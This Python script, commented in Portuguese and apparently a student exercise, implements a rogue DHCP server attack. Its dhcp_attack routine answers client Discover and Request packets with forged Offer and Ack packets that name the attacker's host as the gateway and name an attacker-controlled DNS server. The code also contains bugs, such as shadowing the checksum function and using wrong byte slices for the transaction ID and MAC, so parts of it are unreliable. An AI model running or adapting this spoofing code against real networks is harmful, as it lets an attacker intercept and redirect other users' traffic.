import socket
import struct
import random
import sys

# Funções auxiliares para calcular o checksum dos pacotes IP
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i + 1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s

# Criação do socket RAW para interceptar pacotes DHCP
def create_socket():
    # Replace 'en1' with the actual name of your interface if different
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.bind(('', 67))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    print("Socket Criado...")
    return s

# Função para criar pacotes DHCP Offer
def create_dhcp_offer(transaction_id, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time):
    # cria header ethernet
    # cria header ipv4
    # cria header udp
    # cria header dhcp
    # Define Ethernet header fields
    dest_mac = client_mac
    src_mac = b'\x00\x0c\x29\x8d\x76\x8a'   # Source MAC 
    eth_type = b'\x08\x00'  # Type: IPv4

    eth_header = dest_mac + src_mac + eth_type

    # Define IP header fields
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 0  # Kernel will fill the correct total length
    packet_id = random.randint(0, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    header_checksum = 0
    source_ip = socket.inet_aton(server_ip)
    dest_ip = socket.inet_aton('255.255.255.255')

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, header_checksum, source_ip, dest_ip)
    ip_checksum = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, ip_checksum, source_ip, dest_ip)

    # Define UDP header fields
    source_port = 67
    dest_port = 68
    length = 0  # Kernel will fill the correct length
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)

    # Define DHCP header fields
    op = 2  # Boot Reply (Offer)
    htype = 1  # Ethernet
    hlen = 6  # Hardware address length
    hops = 0
    xid = transaction_id
    secs = 0
    flags = 0x8000  # Broadcast flag
    ciaddr = b'\x00\x00\x00\x00'
    yiaddr = socket.inet_aton(offered_ip)
    siaddr = socket.inet_aton(server_ip)
    giaddr = b'\x00\x00\x00\x00'
    chaddr = src_mac + b'\x00' * 10
    sname = b'\x00' * 64
    file = b'\x00' * 128

    dhcp_header = struct.pack('!BBBBIHHIIII16s64s128s', op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname, file)

    # Define DHCP options
    options = b''
    options += b'\x63\x82\x53\x63'  # Magic cookie
    options += b'\x35\x01\x02'  # DHCP Offer
    options += b'\x01\x04' + socket.inet_aton(subnet_mask)  # Subnet mask
    options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
    options += b'\x06\x04' + socket.inet_aton(dns_ip)  # DNS server
    options += b'\x33\x04' + struct.pack('!I', lease_time)  # Lease time
    options += b'\xff'  # End option

    # Calculate UDP length and checksum
    udp_length = 8 + len(dhcp_header) + len(options)
    print("UDP LEN:", udp_length)
    udp_length = 312
    pseudo_header = source_ip + dest_ip + struct.pack('!BBH', 0, protocol, udp_length)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, 0)
    udp_checksum = checksum(pseudo_header + udp_header + dhcp_header + options)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    # Construct the final packet
    packet = eth_header + ip_header + udp_header + dhcp_header + options

    return packet


# Função para criar pacotes DHCP Acknowledgement
def create_dhcp_ack(transaction_id, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time):
    # Define Ethernet header fields
    dest_mac = client_mac
    src_mac = b'\x00\x0c\x29\x8d\x76\x8a'
    eth_type = b'\x08\x00'

    eth_header = dest_mac + src_mac + eth_type

    # Define IP header fields
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 0
    packet_id = random.randint(0, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    header_checksum = 0
    source_ip = socket.inet_aton(server_ip)
    dest_ip = socket.inet_aton('255.255.255.255')

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, header_checksum, source_ip, dest_ip)
    ip_checksum = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, ip_checksum, source_ip, dest_ip)

    # Define UDP header fields
    source_port = 67
    dest_port = 68
    length = 0  
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)

    # Define DHCP header fields
    op = 2  # Boot Reply (Acknowledgment)
    htype = 1  # Ethernet
    hlen = 6  # Hardware address length
    hops = 0
    xid = transaction_id
    secs = 0
    flags = 0x8000  # Broadcast flag
    ciaddr = b'\x00\x00\x00\x00'
    yiaddr = socket.inet_aton(offered_ip)
    siaddr = socket.inet_aton(server_ip)
    giaddr = b'\x00\x00\x00\x00'
    chaddr = client_mac + b'\x00' * 10
    sname = b'\x00' * 64
    file = b'\x00' * 128

    dhcp_header = struct.pack('!BBBBIHHIIII16s64s128s', op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname, file)

    # Define DHCP options
    options = b''
    options += b'\x63\x82\x53\x63'  
    options += b'\x35\x01\x05'  # DHCP ACK
    options += b'\x01\x04' + socket.inet_aton(subnet_mask)  # Subnet mask
    options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
    options += b'\x06\x04' + socket.inet_aton(dns_ip)  # DNS server
    options += b'\x33\x04' + struct.pack('!I', lease_time)  # Lease time
    options += b'\xff'  # End option

    # Calculate UDP length and checksum
    udp_length = 8 + len(dhcp_header) + len(options)
    pseudo_header = source_ip + dest_ip + struct.pack('!BBH', 0, protocol, udp_length)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, 0)
    udp_checksum = checksum(pseudo_header + udp_header + dhcp_header + options)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    # Construct the final packet
    packet = eth_header + ip_header + udp_header + dhcp_header + options

    return packet

# Função principal para executar o ataque DHCP
def dhcp_attack():
    print("Servidor em execução...")
    s = create_socket()

    # server_ip = '10.32.143.18'
    hostname = socket.gethostname()
    server_ip = socket.gethostbyname(hostname)
    print("SERVER IP: ",server_ip)

    offered_ip = '10.32.240.241'
    subnet_mask = '255.255.255.0'
    router_ip = server_ip
    dns_ip = '8.8.8.8'      # DNS DO SERVIDOR ATACANTE
    lease_time = 86400  

    while True:
        try:
            print("Escutando...")
            packet, addr = s.recvfrom(4096)

            print("Pacote Recebido:", packet)
            print("Endereço:", addr)

            #options = packet[268:272]
            options = packet[282:284]

            message_type = options[2]
            print("MESSAGE TYPE: ", message_type)

            # separa os headers do pacote recebido
            # ver a partir desse
            eth_header = packet[0:14]
            ip_header = packet[14:34]
            udp_header = packet[34:42]
            #dhcp_header = packet[28:328]

            dhcp_header = packet[42:342]

            ## dados do header eth
            destination = eth_header[0:6]
            source = eth_header[6:12]
            type = eth_header[12:14]

            ## dados do header ip
            # protocol = ip_header[10]
            protocol = packet[23]

            # transaction_id = ('!I', dhcp_header[4:8])[0]
            # print("transaction_id", dhcp_header[4:8])

            transaction_id = packet[46:49]
            print("TRANSACTION ID:", transaction_id)

            # client_mac = dhcp_header[28:34]
            client_mac = packet[70:75]
            print("CLIENT MAC:", client_mac)

            if message_type == 1:
                print(f'DHCP Discover recebido de {addr}, enviando DHCP Offer')
                offer_packet = create_dhcp_offer(transaction_id, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time)
                s.sendto(offer_packet, ('<broadcast>', 68))

            elif message_type == 3:
                print(f'DHCP Request recebido de {addr}, enviando DHCP Acknowledgement')
                ack_packet = create_dhcp_ack(transaction_id, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time)
                s.sendto(ack_packet, ('<broadcast>', 68))
        
        except BlockingIOError:
            pass

if __name__ == "__main__":
    try:
        dhcp_attack()
    except PermissionError:
        print("Erro: Este programa deve ser executado com privilégios de superusuário.")
        sys.exit(1)

